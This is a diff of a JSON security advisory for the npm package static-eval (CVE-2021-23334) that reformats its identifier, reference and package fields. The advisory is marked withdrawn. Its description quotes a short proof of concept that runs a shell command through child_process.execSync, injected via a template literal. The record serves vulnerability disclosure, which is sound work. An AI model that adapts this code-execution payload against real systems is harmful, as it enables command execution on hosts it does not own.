@@ -6,32 +6,19 @@
     "description": "All versions of package static-eval are vulnerable to Arbitrary Code Execution using FunctionExpressions and TemplateLiterals. PoC: var evaluate = require('static-eval'); var parse = require('esprima').parse; var src=\"(function (x) { return ${eval(\"console.log(global.process.mainModule.constructor._load('child_process').execSync('ls').toString())\")} })()\" var ast = parse(src).body[0].expression; evaluate(ast)\n\n# WITHDRAWN\n\nThis was deemed not a vulnerability. See [this issue](https://github.com/browserify/static-eval/issues/34) for details.",
     "severity": "critical",
     "identifiers": [
-      {
-        "value": "GHSA-8v27-2fg9-7h62",
-        "type": "GHSA"
-      },
-      {
-        "value": "CVE-2021-23334",
-        "type": "CVE"
-      }
+      { "value": "GHSA-8v27-2fg9-7h62", "type": "GHSA" },
+      { "value": "CVE-2021-23334", "type": "CVE" }
     ],
     "references": [
-      {
-        "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-23334"
-      },
-      {
-        "url": "https://github.com/advisories/GHSA-8v27-2fg9-7h62"
-      }
+      { "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-23334" },
+      { "url": "https://github.com/advisories/GHSA-8v27-2fg9-7h62" }
     ],
     "published_at": "2021-05-06T16:11:25Z",
     "updated_at": "2021-05-06T16:13:08Z",
     "withdrawn_at": "2021-05-06T16:13:08Z",
     "vulnerabilities": [
       {
-        "package": {
-          "ecosystem": "npm",
-          "name": "static-eval"
-        },
+        "package": { "ecosystem": "npm", "name": "static-eval" },
         "severity": "critical",
         "vulnerable_version_range": "<= 2.1.0",
         "first_patched_version": null
